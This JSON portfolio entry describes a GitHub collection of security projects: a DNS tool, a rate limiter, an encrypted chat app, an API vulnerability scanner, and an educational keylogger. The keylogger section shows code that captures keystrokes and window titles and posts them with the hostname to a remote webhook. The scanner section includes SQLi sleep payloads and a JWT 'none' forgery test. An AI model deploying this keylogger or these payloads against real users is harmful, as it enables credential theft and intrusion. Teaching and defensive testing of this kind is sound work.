{
  "slug": "cybersecurity-projects",
  "language": "en",
  "title": "60 Cybersecurity Projects",
  "subtitle": "Hands-on security projects for learning, cloning, and portfolio building",
  "description": "A growing collection of 60 cybersecurity projects ranging from beginner CLI tools to advanced full-stack applications. 5 projects are fully built with complete source code; the remaining 55 have detailed implementation guides that I'm actively building out, open to contributors as well. Clone them as templates, study the patterns, or customize for your own portfolio.",
  "tech_stack": [
    "Python",
    "TypeScript",
    "Haskell",
    "Lua",
    "React",
    "SolidJS",
    "FastAPI",
    "Flask",
    "SQLAlchemy",
    "SQLModel",
    "PostgreSQL",
    "SurrealDB",
    "Redis",
    "Docker",
    "Nginx",
    "SCSS",
    "TailwindCSS",
    "Vite"
  ],
  "github_url": "https://github.com/CarterPerez-dev/Cybersecurity-Projects",
  "demo_url": null,
  "website_url": null,
  "docs_url": null,
  "blog_url": null,
  "pypi_url": null,
  "npm_url": null,
  "ios_url": null,
  "android_url": null,
  "code_snippet": null,
  "code_language": null,
  "code_filename": null,
  "thumbnail_url": "project-cyber-projects/thumbnail.webp",
  "banner_url": "project-cyber-projects/banner.webp",
  "screenshots": null,
  "stars_count": 105,
  "forks_count": 11,
  "downloads_count": null,
  "users_count": null,
  "display_order": 2,
  "is_complete": false,
  "is_featured": true,
  "status": "active",
  "start_date": "2025-12-07",
  "end_date": null,
  "technical_details": "## Keylogger\n\n**Category:** Intermediate | **Status:** Complete\n\nAn educational keylogger built for security research and penetration testing training. The project demonstrates how real malware captures credentials through keyboard hooks, active window context, and command-and-control (C2) exfiltration. What makes it technically interesting is the cross-platform window tracking and the batched webhook delivery that simulates actual APT communication patterns.\n\n### How It Works\n\nThe keylogger uses pynput's event-driven model to hook into OS-level keyboard events. When a key is pressed, it's processed into a `KeyEvent` dataclass that captures the timestamp, key representation, and active window context. Events flow through three subsystems: `LogManager` handles file I/O with automatic rotation, `WebhookDelivery` buffers events for batched C2 delivery, and `WindowTracker` provides platform-specific window title detection. Everything is thread-safe with locks protecting shared state.\n\n```python\n@staticmethod\ndef get_active_window() -> str | None:\n    system = platform.system()\n\n    if system == \"Windows\" and win32gui:\n        return WindowTracker._get_windows_window()\n    if system == \"Darwin\" and NSWorkspace:\n        return WindowTracker._get_macos_window()\n    if system == \"Linux\":\n        return WindowTracker._get_linux_window()\n\n    return None\n\n@staticmethod\ndef _get_windows_window() -> str | None:\n    try:\n        window = win32gui.GetForegroundWindow()\n        _, pid = win32process.GetWindowThreadProcessId(window)\n        process = psutil.Process(pid)\n        window_title = win32gui.GetWindowText(window)\n        return f\"{process.name()} - {window_title}\" if window_title else process.name()\n    except Exception:\n        return None\n```\n\nThe WindowTracker abstracts away OS differences. Windows uses win32gui with psutil for process names, macOS hits NSWorkspace, and Linux shells out to xdotool. Window checks are rate-limited to 500ms intervals to avoid hammering the OS APIs.\n\n### Technical Decisions\n\n- pynput over pyHook/keyboard: Cross-platform support out of the box without separate Windows/Linux implementations\n- Dataclasses for KeyEvent and Config: Clean serialization to JSON for webhook payloads, immutable-ish config\n- Batched webhook delivery: Events buffer until batch size (default 50) is reached, mimicking real C2 traffic patterns that avoid per-keystroke beaconing\n- Log rotation by size: Prevents disk exhaustion on long-running captures, rotates at 5MB by default\n- Threading.Event for state: `is_running` and `is_logging` flags allow clean shutdown and F9 toggle without race conditions\n\n```python\ndef _deliver_batch(self) -> None:\n    if not self.event_buffer or not self.config.webhook_url:\n        return\n\n    payload = {\n        \"timestamp\": datetime.now().isoformat(),\n        \"host\": platform.node(),\n        \"events\": [event.to_dict() for event in self.event_buffer]\n    }\n\n    try:\n        response = requests.post(\n            self.config.webhook_url,\n            json = payload,\n            timeout = 5\n        )\n        if response.status_code == 200:\n            self.event_buffer.clear()\n    except Exception as e:\n        logging.error(\"Webhook delivery failed: %s\", e)\n```\n\nThe webhook delivery includes hostname for victim identification, batches events into a single payload, and only clears the buffer on successful delivery. Failed deliveries retain events for retry, which is how actual malware maintains persistence through network interruptions.\n\n### Stack\nPython 3.13+, pynput, requests, win32gui/psutil (Windows), pyobjc (macOS), xdotool (Linux)\n\n---\n\n## DNS Lookup Tool\n\n**Category:** Intermediate | **Status:** Complete\n\nA professional DNS query CLI that goes beyond simple lookups. The tool performs multi-record queries, reverse lookups, batch processing, and WHOIS retrieval with Rich terminal output. The standout capability is DNS trace, which visualizes the complete resolution path from root servers through TLD servers to authoritative nameservers, showing exactly how DNS delegation works.\n\n### How It Works\n\nThe resolver uses dnspython's async capabilities to query multiple record types concurrently. For standard lookups, it fires off parallel queries for each requested record type and aggregates results. For tracing, it implements iterative resolution manually, starting at root servers and following NS referrals down the hierarchy until reaching the authoritative answer.\n\nThe CLI layer uses Typer with Rich integration for progress spinners during queries and formatted output tables. Results can be exported as JSON for scripting or displayed with color coded record types and human readable TTL formatting.\n\n```python\nwhile True:\n    server_name, server_ip = current_servers[0]\n    query = dns.message.make_query(name, rdtype)\n    response = dns.query.udp(query, server_ip, timeout=3.0)\n\n    if response.answer:\n        for rrset in response.answer:\n            for rdata in rrset:\n                result.final_answer = str(rdata)\n        result.hops.append(TraceHop(\n            zone=current_zone, server=server_name,\n            server_ip=server_ip,\n            response=f\"{record_type}: {result.final_answer}\",\n            is_authoritative=True,\n        ))\n        break\n\n    if response.authority:\n        # Extract NS records and follow referrals\n        glue_ips = {str(rrset.name).rstrip(\".\"): rdata.address\n                    for rrset in response.additional\n                    if rrset.rdtype == dns.rdatatype.A\n                    for rdata in rrset}\n```\n\nThis is the core of the trace command. It manually walks the DNS hierarchy by sending queries to each level and following referrals, handling glue records when available or resolving nameserver IPs when not.\n\n### Technical Decisions\n\n- Chose iterative resolution over recursive for tracing to expose the actual delegation chain rather than just getting a final answer\n- Used `asyncio.gather` with `return_exceptions=True` to handle partial failures gracefully in batch lookups without killing the entire operation\n- Implemented TTL formatting that auto scales between seconds, minutes, hours, and days for readability\n- Separated output formatting entirely from resolution logic, making JSON export trivial\n\n```python\nasync def batch_lookup(\n    domains: list[str],\n    record_types: list[RecordType] | None = None,\n    nameserver: str | None = None,\n    timeout: float = 5.0,\n) -> list[DNSResult]:\n    tasks = [lookup(domain, record_types, nameserver, timeout) \n             for domain in domains]\n    return await asyncio.gather(*tasks)\n```\n\nBatch lookups fan out concurrently rather than sequentially, so querying 100 domains takes roughly the same time as querying one.\n\n### Stack\nPython 3.13, dnspython, Typer, Rich, python-whois, pytest, mypy, ruff\n\n---\n\n## Full Stack API Security Scanner\n\n**Category:** Intermediate | **Status:** Complete\n\nA dockerized security testing platform that scans APIs for common vulnerabilities mapped to the OWASP API Security Top 10. The scanner orchestrates four specialized modules covering rate limiting, authentication flaws, SQL injection, and IDOR/BOLA vulnerabilities. What makes it technically interesting is the statistical approach to blind vulnerability detection and the production safe request handling that prevents the scanner itself from causing service disruptions.\n\n### How It Works\n\nThe backend follows a layered architecture with FastAPI handling routing, a service layer orchestrating business logic, and a repository layer abstracting database operations. Each vulnerability scanner inherits from a BaseScanner class that provides common HTTP functionality including request spacing, retry logic with exponential backoff, and evidence collection. When a scan is initiated, the ScanService instantiates the requested scanner classes, executes them sequentially, and persists results through the repository layer.\n\nThe scanner modules implement distinct detection strategies based on vulnerability type. Error based SQLi looks for database signatures in responses. Boolean based detection compares response lengths between true and false injected conditions. Time based blind detection establishes a baseline response time using multiple samples, then uses statistical analysis to identify delays caused by sleep payloads while minimizing false positives. The auth scanner tests for missing authentication, JWT none algorithm acceptance, and signature validation bypasses.\n\n```python\ndef _test_time_based_sqli(self, delay_seconds: int = 5) -> dict[str, Any]:\n    try:\n        baseline_mean, baseline_stdev = self.get_baseline_timing(\"/\")\n        threshold = baseline_mean + (3 * baseline_stdev)\n        expected_delay_time = baseline_mean + delay_seconds\n\n        delay_payloads = {\n            \"mysql\": [p for p in all_time_payloads if \"SLEEP\" in p],\n            \"postgres\": [p for p in all_time_payloads if \"pg_sleep\" in p],\n            \"mssql\": [p for p in all_time_payloads if \"WAITFOR\" in p],\n        }\n\n        for db_type, payloads in delay_payloads.items():\n            for payload in payloads:\n                delay_times = []\n                for _ in range(3):\n                    response = self.make_request(\"GET\", f\"/?id={payload}\", timeout=delay_seconds + 10)\n                    delay_times.append(getattr(response, \"request_time\", 0.0))\n                    time.sleep(1)\n\n                avg_delay = statistics.mean(delay_times)\n                if avg_delay >= expected_delay_time - 1:\n                    return {\"vulnerable\": True, \"database_type\": db_type, \"confidence\": \"HIGH\" if avg_delay >= expected_delay_time else \"MEDIUM\"}\n```\n\nThis time based SQLi detection uses statistical baselining rather than hardcoded thresholds, taking multiple samples to establish normal response variance before testing delay payloads across MySQL, PostgreSQL, and MSSQL syntax variations.\n\n### Technical Decisions\n\n- Used abstract base class pattern for scanners so common HTTP logic like rate limiting and retry handling lives in one place while each vulnerability type implements its own detection strategy\n- Implemented request spacing with configurable jitter to avoid overwhelming targets or triggering rate limits during scans, calculated dynamically based on max requests and time window\n- JWT testing covers case variations of the none algorithm since some implementations only check lowercase, plus signature removal and malformed token acceptance\n- Rate limit bypass testing includes IP header spoofing via X-Forwarded-For and X-Real-IP, plus endpoint path variations that sometimes bypass case sensitive rate limiters\n- Frontend uses Zustand with immer for immutable state updates and persistence middleware to preserve form state across sessions with automatic expiration after seven days\n- Type guards validate all API responses at runtime before the data enters application state, catching backend contract violations early\n\n```python\ndef _test_none_algorithm(self) -> dict[str, Any]:\n    try:\n        header, payload, signature = self.auth_token.split(\".\")\n        none_variants = AuthPayloads.get_jwt_none_variants()  # [\"none\", \"None\", \"NONE\", \"nOnE\", ...]\n\n        for variant in none_variants:\n            malicious_header = self._base64url_encode(json.dumps({\"alg\": variant, \"typ\": \"JWT\"}))\n            malicious_token = f\"{malicious_header}.{payload}.\"\n\n            response = self.make_request(\"GET\", \"/\", headers={\"Authorization\": f\"Bearer {malicious_token}\"})\n            if response.status_code == 200:\n                return {\"vulnerable\": True, \"vulnerability_type\": \"JWT None Algorithm\", \"algorithm_variant\": variant}\n\n        return {\"vulnerable\": False, \"description\": \"None algorithm properly rejected\"}\n    except Exception as e:\n        return {\"vulnerable\": False, \"error\": str(e)}\n```\n\nThe JWT none algorithm test constructs tokens with various case permutations of \"none\" as the algorithm, strips the signature, and checks if the API accepts them. A vulnerable endpoint would return 200, indicating it processes unsigned tokens.\n\n### Stack\nPython, FastAPI, SQLAlchemy, PostgreSQL, React, TypeScript, Zustand, TanStack Query, Docker, Nginx\n\n---\n\n## FastAPI-420 (API Rate Limiter)\n\n**Category:** Advanced | **Status:** Complete\n\nA production grade rate limiting library for FastAPI that implements a three layer defense system against API abuse and DDoS attacks. The \"420\" in the name references Twitter's old HTTP 420 \"Enhance Your Calm\" response code, which the library resurfaces instead of the standard 429. What makes this technically interesting is the convergence of several hard problems: atomic distributed counters via Lua scripts, sophisticated client fingerprinting that accounts for IPv6 /64 prefix exploitation, a circuit breaker pattern with multiple defense modes, and a clean abstraction layer that lets you swap algorithms and storage backends without touching application code. The whole thing is typed end to end with runtime checkable protocols and ships with both blocking middleware and a \"slow down\" variant that adds progressive delays instead of hard rejections.\n\n### How It Works\n\nThe architecture operates on three defensive layers that requests must pass through sequentially. Layer 1 handles per user per endpoint limiting using composite fingerprints built from IP addresses, user agents, authentication tokens, and optionally TLS fingerprints and header ordering. Layer 2 protects individual endpoints from being overwhelmed by applying global limits per route, so a single endpoint can't consume all available capacity. Layer 3 is a circuit breaker that monitors total API traffic and can trip into different defense modes when thresholds are exceeded.\n\nThe layered defense coordinator processes requests through all three layers and raises an `EnhanceYourCalm` exception (HTTP 420) at the first failure. Each layer builds its own rate limit key using a structured format: `{prefix}:{version}:{layer}:{endpoint}:{identifier}:{window}`. This key structure means you can inspect Redis directly during debugging and immediately understand what you're looking at.\n\n```python\nasync def check_all_layers(\n    self,\n    request: Request,\n    fingerprint: FingerprintData,\n    endpoint: str,\n    rules: list[RateLimitRule],\n) -> RateLimitResult:\n    \"\"\"\n    Check all defense layers in order\n    \"\"\"\n    context = DefenseContext(\n        fingerprint = fingerprint,\n        endpoint = endpoint,\n        method = request.method,\n        is_authenticated = fingerprint.auth_identifier is not None,\n    )\n\n    layer3_result = await self._check_layer3_global(context)\n    if not layer3_result.allowed:\n        self._log_violation(layer3_result, context)\n        raise EnhanceYourCalm(\n            result = layer3_result.result,\n            message = self._settings.HTTP_420_MESSAGE,\n            detail = \"API is under heavy load. Please try again later.\",\n        )\n\n    layer2_result = await self._check_layer2_endpoint(context, rules)\n    if not layer2_result.allowed:\n        self._log_violation(layer2_result, context)\n        raise EnhanceYourCalm(\n            result = layer2_result.result,\n            message = self._settings.HTTP_420_MESSAGE,\n            detail = self._settings.HTTP_420_DETAIL,\n        )\n\n    layer1_result = await self._check_layer1_user(context, rules)\n    if not layer1_result.allowed:\n        self._log_violation(layer1_result, context)\n        raise EnhanceYourCalm(\n            result = layer1_result.result,\n            message = self._settings.HTTP_420_MESSAGE,\n            detail = self._settings.HTTP_420_DETAIL,\n        )\n\n    return layer1_result.result\n```\n\nThe layered defense system short circuits at the first failure, checking global health before wasting cycles on per user lookups. The defense context carries authentication state and reputation scores that downstream layers can use to make bypass decisions.\n\nStorage is abstracted behind a protocol interface with two implementations: Redis for distributed deployments and in memory for single instance or development use. The Redis backend preloads Lua scripts at startup and executes them via EVALSHA to guarantee atomicity without retransmitting script bodies on every call. If Redis returns NOSCRIPT (scripts evicted from cache), the backend automatically reloads and retries.\n\nThe library supports four rate limiting algorithms that all implement the same `BaseAlgorithm` abstract class: sliding window uses weighted interpolation between two fixed windows for approximately 99.997% accuracy with O(1) memory per client; token bucket allows controlled bursting up to bucket capacity while enforcing average rates; fixed window is simpler but suffers from the boundary burst problem; leaky bucket is aliased to sliding window since the implementations are functionally equivalent for most use cases.\n\n```lua\n--[[\nsliding_window.lua\nAtomic sliding window counter rate limiting.\nReturns: {allowed (0/1), remaining, reset_after}\n--]]\n\nlocal key = KEYS[1]\nlocal window_seconds = tonumber(ARGV[1])\nlocal limit = tonumber(ARGV[2])\nlocal now = tonumber(ARGV[3])\n\nlocal current_window = math.floor(now / window_seconds)\nlocal previous_window = current_window - 1\nlocal elapsed_ratio = (now % window_seconds) / window_seconds\n\nlocal current_key = key .. \":\" .. current_window\nlocal previous_key = key .. \":\" .. previous_window\n\nlocal current_count = tonumber(redis.call('GET', current_key)) or 0\nlocal previous_count = tonumber(redis.call('GET', previous_key)) or 0\n\nlocal weighted_count = math.floor(previous_count * (1 - elapsed_ratio) + current_count)\nlocal reset_after = window_seconds - (now % window_seconds)\n\nif weighted_count >= limit then\n    return {0, 0, reset_after, reset_after}\nend\n\nredis.call('INCR', current_key)\nredis.call('EXPIRE', current_key, window_seconds * 2)\n\nlocal new_weighted = math.floor(previous_count * (1 - elapsed_ratio) + current_count + 1)\nlocal remaining = math.max(0, limit - new_weighted)\n\nreturn {1, remaining, reset_after, 0}\n```\n\nThe sliding window Lua script runs atomically in Redis. The weighted interpolation formula `previous_count * (1 - elapsed_ratio) + current_count` smoothly transitions between windows, eliminating the boundary burst vulnerability where attackers could make 2x the limit by timing requests at window edges. Keys expire after 2x the window duration to ensure the previous window is always available for the calculation.\n\nThe fingerprinting system is where this gets particularly interesting. Rather than relying solely on IP addresses, the `CompositeFingerprinter` builds identifiers from multiple signals based on configurable intensity levels. Strict mode uses everything: IP, user agent, accept headers, header ordering, auth tokens, TLS/JA3 fingerprints, and geographic ASN. Normal mode (the default) uses IP, user agent, and auth. Relaxed mode uses just IP and auth for maximum compatibility.\n\n```python\nclass CompositeFingerprinter:\n    \"\"\"\n    Combines multiple fingerprinting methods based on configuration\n\n    Preset levels determine which extractors are used:\n    - strict: All methods (IP, headers, auth, TLS, geo)\n    - normal: IP + User-Agent + Auth (default)\n    - relaxed: IP + Auth only\n    - custom: Configured via settings\n    \"\"\"\n    def __init__(\n        self,\n        level: FingerprintLevel = FingerprintLevel.NORMAL,\n        ip_extractor: IPExtractor | None = None,\n        headers_extractor: HeadersExtractor | None = None,\n        auth_extractor: AuthExtractor | None = None,\n        use_ip: bool = True,\n        use_user_agent: bool = True,\n        use_accept_headers: bool = False,\n        use_header_order: bool = False,\n        use_auth: bool = True,\n        use_tls: bool = False,\n        use_geo: bool = False,\n    ) -> None:\n        self.level = level\n        self._ip_extractor = ip_extractor or IPExtractor()\n        self._headers_extractor = headers_extractor or HeadersExtractor(\n            use_header_order = use_header_order,\n        )\n        self._auth_extractor = auth_extractor or AuthExtractor()\n\n        if level == FingerprintLevel.STRICT:\n            self.use_ip = True\n            self.use_user_agent = True\n            self.use_accept_headers = True\n            self.use_header_order = True\n            self.use_auth = True\n            self.use_tls = True\n            self.use_geo = True\n        elif level == FingerprintLevel.RELAXED:\n            self.use_ip = True\n            self.use_user_agent = False\n            self.use_accept_headers = False\n            self.use_header_order = False\n            self.use_auth = True\n            self.use_tls = False\n            self.use_geo = False\n        # ... continues for other levels\n```\n\nHeader ordering is particularly clever for fingerprinting because it's browser specific and not user configurable. Chrome, Firefox, and Safari all send headers in different orders, so even if an attacker spoofs a user agent string, the header order often betrays the true client.\n\nFor IPv6 clients, raw addresses are normalized to their /64 network prefix. This matters because residential and mobile users typically control entire /64 blocks (roughly 18 quintillion addresses), making naive per IP rate limiting completely ineffective. An attacker could trivially rotate through addresses within their allocation. The normalization collapses all addresses in a /64 to the network address, treating them as a single identity.\n\n```python\ndef _normalize_ip(self, ip_str: str) -> str:\n    \"\"\"\n    Normalize IP address for rate limiting\n\n    IPv6 addresses are normalized to their /64 network prefix\n    since users typically control entire /64 blocks.\n    \"\"\"\n    try:\n        addr = ip_address(ip_str)\n    except ValueError:\n        return ip_str\n\n    if isinstance(addr, IPv6Address):\n        if addr.ipv4_mapped:\n            return str(addr.ipv4_mapped)\n\n        network = ip_network(\n            f\"{ip_str}/{self.ipv6_prefix_length}\",\n            strict = False,\n        )\n        return str(network.network_address)\n\n    return str(addr)\n```\n\nThe authentication extractor implements a fallback chain: JWT subject claim first, then API key header, then API key query parameter, then session cookie. JWT parsing works with or without secret verification since the library only needs identity for rate limiting, not authorization. When a secret isn't configured, it extracts the subject claim without validation, which is safe because the rate limit key is just a bucket identifier, not a trust decision.\n\n### Technical Decisions\n\n- Chose sliding window over pure fixed window to eliminate the boundary burst problem. With fixed windows, an attacker who makes 100 requests at 11:59:59 and another 100 at 12:00:01 effectively gets 200 requests in 2 seconds despite a 100/minute limit. The weighted interpolation smoothly transitions between windows, maintaining accurate counts regardless of when requests arrive.\n\n- Used EVALSHA with cached script hashes rather than EVAL to avoid retransmitting Lua script bodies on every Redis operation. Scripts are loaded once at startup via `script_load` and the SHA1 hashes are cached. If Redis returns NOSCRIPT (indicating scripts were evicted from the script cache), the backend catches the exception, reloads all scripts, and retries transparently.\n\n- Implemented IPv6 /64 prefix normalization because the standard /128 per address approach is trivially bypassable. Most IPv6 allocations give users at minimum a /64, and many ISPs hand out /56 or even /48 prefixes. The configurable `ipv6_prefix_length` parameter lets operators tune this for their threat model.\n\n- Built the circuit breaker with multiple defense modes rather than just open/closed. Adaptive mode allows authenticated users through when the circuit trips, maintaining service for legitimate users during attacks. Lockdown mode restricts traffic to clients with high reputation scores. The half open state allows gradual recovery testing before fully closing the circuit.\n\n- The fingerprinting system uses header ordering as an anti spoofing signal. Browsers send headers in deterministic but browser specific orders that users can't change. Even if an attacker sets a Chrome user agent string, their header order might reveal they're actually using curl or a Python script.\n\n- Memory storage uses `OrderedDict` with LRU eviction to bound memory usage. When max keys is exceeded, the oldest entries (by access time) are evicted first. A background asyncio task periodically cleans up expired entries to prevent memory leaks from abandoned rate limit buckets.\n\n- The dependency injection system provides multiple integration patterns: a `@limiter.limit()` decorator for route level limits, a `RateLimitDep` class that works with FastAPI's `Depends()`, a `ScopedRateLimiter` for applying different rules to route groups, and full middleware for blanket coverage. This flexibility means the library works regardless of how your FastAPI app is structured.\n\n- Built an alternative `SlowDownMiddleware` that adds progressive delays instead of hard blocks. This is useful for gradual degradation where you want to discourage abuse without completely cutting off borderline users. Delay increments are configurable up to a maximum.\n\n```python\nclass RateLimitDep:\n    \"\"\"\n    FastAPI dependency for rate limiting\n\n    Usage:\n        @app.get(\"/api/data\", dependencies=[Depends(RateLimitDep(\"100/minute\"))])\n        async def get_data():\n            return {\"data\": \"value\"}\n\n        # Or with result access:\n        @app.get(\"/api/data\")\n        async def get_data(limit_result: Annotated[RateLimitResult, Depends(RateLimitDep(\"100/minute\"))]):\n            return {\"remaining\": limit_result.remaining}\n    \"\"\"\n    def __init__(\n        self,\n        *rules: str,\n        limiter: RateLimiter | None = None,\n        key_func: Callable[[Request], str] | None = None,\n    ) -> None:\n        self.rules = [RateLimitRule.parse(rule) for rule in rules]\n        self._limiter = limiter\n        self.key_func = key_func\n\n    async def __call__(self, request: Request) -> RateLimitResult:\n        \"\"\"\n        Check rate limit and return result\n        \"\"\"\n        rule_strings = [str(rule) for rule in self.rules]\n        return await self.limiter.check(\n            request,\n            *rule_strings,\n            key_func = self.key_func,\n            raise_on_limit = True,\n        )\n```\n\nThe dependency class parses rule strings at instantiation time rather than on every request, and exposes the `RateLimitResult` so routes can access remaining quota, reset times, and other metadata for their own logic.\n\n- Used Pydantic's `model_validator` for configuration validation with environment specific enforcement. Production deployments require either a Redis URL or explicit acknowledgment that memory fallback is acceptable. Rate limit strings are validated at config load time so malformed rules fail fast rather than at runtime.\n\n- The exception hierarchy distinguishes between rate limit exceeded (user's fault), storage errors (infrastructure problem), configuration errors (developer's fault), and circuit breaker open (system protection). Each exception type carries structured details for logging and debugging rather than just message strings.\n\n### Stack\nPython 3.12+, FastAPI, Starlette, Redis, Pydantic, Pydantic Settings, PyJWT, Lua, asyncio, mypy (strict mode), ruff, pylint\n\n---\n\n## Encrypted P2P Chat\n\n**Category:** Advanced | **Status:** Active\n\nA full implementation of the Signal Protocol for end-to-end encrypted messaging, built from scratch with no cryptographic shortcuts. The system implements X3DH (Extended Triple Diffie-Hellman) for asynchronous key exchange and the Double Ratchet algorithm for forward secrecy, meaning every single message uses a unique encryption key derived through a chain of cryptographic operations. Authentication is entirely passwordless via WebAuthn/FIDO2 passkeys, eliminating credential databases entirely.\n\nThe architecture uses three databases, each optimized for its specific role: PostgreSQL handles user identity and credential storage with ACID guarantees, SurrealDB provides real-time document storage with native live queries for instant message delivery, and Redis manages ephemeral WebAuthn challenges with automatic TTL expiration. The frontend is built in SolidJS rather than React, using fine-grained reactivity for a smaller bundle and better performance in a real-time messaging context.\n\n### How It Works\n\nThe encryption pipeline begins when a user initiates a conversation. The sender retrieves the recipient's prekey bundle from the server, which contains their long-term identity key, a medium-term signed prekey (rotated every 48 hours), and optionally a single-use one-time prekey. The X3DH protocol performs four Diffie-Hellman operations between various combinations of these keys and a freshly generated ephemeral keypair, then derives a shared secret through HKDF. This shared secret initializes the Double Ratchet.\n\nOnce the ratchet is initialized, every message triggers a symmetric key ratchet step that derives a unique message key and advances the chain. When the recipient responds, a DH ratchet step occurs: both parties generate new ephemeral keypairs, perform fresh DH exchanges, and derive entirely new root and chain keys. This means compromising a single message key reveals nothing about past or future messages. The implementation also handles out-of-order delivery by caching skipped message keys, bounded by configurable limits to prevent memory exhaustion attacks.\n\n```python\ndef encrypt_message(\n    self,\n    state: DoubleRatchetState,\n    plaintext: bytes,\n    associated_data: bytes\n) -> EncryptedMessage:\n    \"\"\"\n    Encrypts message and advances sending ratchet\n    \"\"\"\n    state.sending_chain_key, message_key = self._kdf_ck(\n        state.sending_chain_key\n    )\n\n    nonce, ciphertext = self._encrypt_with_message_key(\n        message_key,\n        plaintext,\n        associated_data\n    )\n\n    if state.dh_private_key:\n        dh_public = state.dh_private_key.public_key()\n        dh_public_bytes = dh_public.public_bytes(\n            encoding = serialization.Encoding.Raw,\n            format = serialization.PublicFormat.Raw\n        )\n    else:\n        dh_public_bytes = b'\\x00' * X25519_KEY_SIZE\n\n    encrypted_msg = EncryptedMessage(\n        ciphertext = ciphertext,\n        nonce = nonce,\n        dh_public_key = dh_public_bytes,\n        message_number = state.sending_message_number,\n        previous_chain_length = state.previous_sending_chain_length\n    )\n\n    state.sending_message_number += 1\n    return encrypted_msg\n```\n\nThis is the core encryption path. Each call derives a fresh message key from the chain key using HMAC, encrypts with AES-256-GCM, and packages the sender's current DH public key into the message header so the recipient can perform the DH ratchet step.\n\nThe WebSocket layer maintains persistent connections with automatic heartbeats and reconnection logic. When a message arrives, SurrealDB's live query system pushes it directly to the recipient's connection manager, which routes it to all their active devices. The connection manager enforces per-user connection limits and handles graceful degradation when connections die.\n\n```python\nasync def connect(self, websocket: WebSocket, user_id: UUID) -> bool:\n    \"\"\"\n    Accept WebSocket connection and register user\n    \"\"\"\n    await websocket.accept()\n\n    if user_id not in self.active_connections:\n        self.active_connections[user_id] = []\n\n    if len(self.active_connections[user_id]) >= WS_MAX_CONNECTIONS_PER_USER:\n        await self._send_error(\n            websocket,\n            \"max_connections\",\n            f\"Maximum {WS_MAX_CONNECTIONS_PER_USER} connections per user\"\n        )\n        await websocket.close()\n        return False\n\n    self.active_connections[user_id].append(websocket)\n\n    try:\n        await presence_service.set_user_online(user_id)\n    except Exception as e:\n        await self._send_error(websocket, \"database_error\", \"Failed to initialize connection\")\n        self.active_connections[user_id].remove(websocket)\n        if not self.active_connections[user_id]:\n            del self.active_connections[user_id]\n        await websocket.close()\n        return False\n\n    self.heartbeat_tasks[user_id] = asyncio.create_task(\n        self._heartbeat_loop(websocket, user_id)\n    )\n\n    await self._subscribe_to_messages(user_id)\n    return True\n```\n\nConnection management handles multi-device scenarios, enforces limits, initializes presence tracking, starts the heartbeat loop, and subscribes to SurrealDB live queries for incoming messages, all atomically with proper cleanup on any failure.\n\n### Technical Decisions\n\n**X25519 + Ed25519 dual keypairs for identity**: The protocol requires both key agreement (for DH operations) and signing (for prekey authentication). Rather than using a single curve with transformations, maintaining separate X25519 and Ed25519 keypairs is cleaner and avoids subtle cryptographic footguns.\n\n**SurrealDB for real-time data**: PostgreSQL with LISTEN/NOTIFY would work, but SurrealDB's native live queries eliminate the need for a separate pub/sub layer. The tradeoff is operational complexity of running a newer database, but the developer experience for real-time features is significantly better.\n\n**Skipped message key eviction strategy**: The Double Ratchet must store keys for messages that arrive out of order, but unbounded storage enables DoS attacks. The implementation uses a configurable maximum (1000 keys) with FIFO eviction, balancing reliability against resource exhaustion.\n\n**WebAuthn with discoverable credentials**: Passkeys are configured as resident/discoverable, meaning the authenticator stores the credential and the user doesn't need to provide a username. This enables true single-gesture authentication on devices with platform authenticators.\n\n**Signature counter verification**: Each WebAuthn authentication increments a counter stored on the authenticator. The server tracks this and rejects authentications where the counter doesn't increase, detecting cloned authenticators.\n\n**Redis for challenge storage with atomic get-and-delete**: WebAuthn challenges are single-use and time-limited. Using Redis pipelines to atomically retrieve and delete challenges prevents replay attacks without race conditions.\n\n```typescript\nasync function initiateX3DH(\n  identityKeyPair: IdentityKeyPair,\n  recipientBundle: PreKeyBundle\n): Promise<X3DHResult> {\n  const signatureValid = await verifySignedPreKey(\n    recipientBundle.identity_key,\n    recipientBundle.signed_prekey,\n    recipientBundle.signed_prekey_signature\n  )\n\n  if (!signatureValid) {\n    throw new Error(\"Invalid signed prekey signature\")\n  }\n\n  const ephemeralKeyPair = await generateX25519KeyPair()\n  const ephemeralPublic = await exportPublicKey(ephemeralKeyPair.publicKey)\n\n  const senderIdentityPrivate = await importX25519PrivateKey(\n    base64ToBytes(identityKeyPair.x25519_private)\n  )\n  const recipientIdentityPublic = await importX25519PublicKey(\n    base64ToBytes(recipientBundle.identity_key)\n  )\n  const recipientSignedPreKeyPublic = await importX25519PublicKey(\n    base64ToBytes(recipientBundle.signed_prekey)\n  )\n\n  const dh1 = await x25519DeriveSharedSecret(senderIdentityPrivate, recipientSignedPreKeyPublic)\n  const dh2 = await x25519DeriveSharedSecret(ephemeralKeyPair.privateKey, recipientIdentityPublic)\n  const dh3 = await x25519DeriveSharedSecret(ephemeralKeyPair.privateKey, recipientSignedPreKeyPublic)\n\n  let dhResults: Uint8Array[]\n  let usedOneTimePreKey = false\n\n  if (recipientBundle.one_time_prekey) {\n    const recipientOneTimePreKeyPublic = await importX25519PublicKey(\n      base64ToBytes(recipientBundle.one_time_prekey)\n    )\n    const dh4 = await x25519DeriveSharedSecret(ephemeralKeyPair.privateKey, recipientOneTimePreKeyPublic)\n    dhResults = [dh1, dh2, dh3, dh4]\n    usedOneTimePreKey = true\n  } else {\n    dhResults = [dh1, dh2, dh3]\n  }\n\n  const concatenated = concatBytes(...dhResults)\n  const sharedKey = await hkdfDerive(concatenated, EMPTY_SALT, X3DH_INFO, 32)\n\n  const senderIdentityPublic = base64ToBytes(identityKeyPair.x25519_public)\n  const recipientIdentityBytes = base64ToBytes(recipientBundle.identity_key)\n  const associatedData = concatBytes(senderIdentityPublic, recipientIdentityBytes)\n\n  return {\n    shared_key: sharedKey,\n    associated_data: associatedData,\n    ephemeral_public_key: bytesToBase64(ephemeralPublic),\n    used_one_time_prekey: usedOneTimePreKey,\n  }\n}\n```\n\nThe complete X3DH sender flow: verify the signed prekey to prevent MITM attacks, generate a fresh ephemeral keypair, perform three or four DH operations depending on one-time prekey availability, concatenate and run through HKDF for the final shared secret. The associated data binding both identity keys into the encryption context prevents key-compromise impersonation attacks.\n\n### Stack\nPython 3.13, FastAPI, SQLModel, PostgreSQL, SurrealDB, Redis, WebAuthn (py_webauthn), cryptography, SolidJS, TypeScript, Tailwind CSS, Nanostores, Web Crypto API, Docker, Nginx\n"
}
